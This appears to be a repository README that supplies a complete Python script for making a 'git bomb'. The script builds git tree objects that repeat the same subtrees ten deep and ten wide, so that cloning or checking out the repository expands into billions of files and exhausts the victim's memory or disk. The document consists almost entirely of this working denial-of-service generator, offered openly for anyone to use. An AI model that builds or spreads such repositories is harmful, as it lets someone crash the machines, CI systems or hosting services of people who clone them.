# Git bomb

A (nearly) uncloneable repo. Make your own git bombs:

```python
#! /usr/bin/env python3
import binascii
import subprocess
import tempfile


def write_git_object(object_body, type='tree'):
    '''Writes a git object and returns the hash'''
    with tempfile.NamedTemporaryFile() as f:
        f.write(object_body)
        f.flush()
        command = ['git', 'hash-object', '-w', '-t', type, f.name]
        return subprocess.check_output(command).strip()


def write_git_commit(tree_hash, commit_message='Create a git bomb'):
    '''Writes a git commit and returns the hash'''
    command = ['git', 'commit-tree', '-m', commit_message, tree_hash]
    return subprocess.check_output(command).strip()


def create_tree(dirs, perm):
    body = b''
    for a_dir in sorted(dirs, key=lambda x: x[0]):
        body += bytearray(perm, 'ascii') + b'\x20' + bytearray(a_dir[0], 'ascii') + b'\x00' + binascii.unhexlify(a_dir[1])
    return body


def create_blob(body=''):
    return bytearray(body, 'ascii')


if __name__ == '__main__':
    depth = 10  # how many layers deep
    width = 10  # how many files or folders per depth level
    blob_body = 'one laugh'  # content of blob at bottom

    # create base blob
    blob_hash = write_git_object(create_blob(body=blob_body), type='blob')

    # write tree object containing many files
    dirs = [('f' + str(i), blob_hash) for i in range(width)]
    tree_hash = write_git_object(create_tree(dirs, '100644'), type='tree')

    # make layers of tree objects using the previous tree object
    for i in range(depth - 1):
        other_dirs = [('d' + str(i), tree_hash) for i in range(width)]
        tree_hash = write_git_object(create_tree(other_dirs, '40000'), type='tree')

    commit_hash = write_git_commit(tree_hash)

    # update master ref
    open('.git/refs/heads/master', 'wb').write(commit_hash)
```
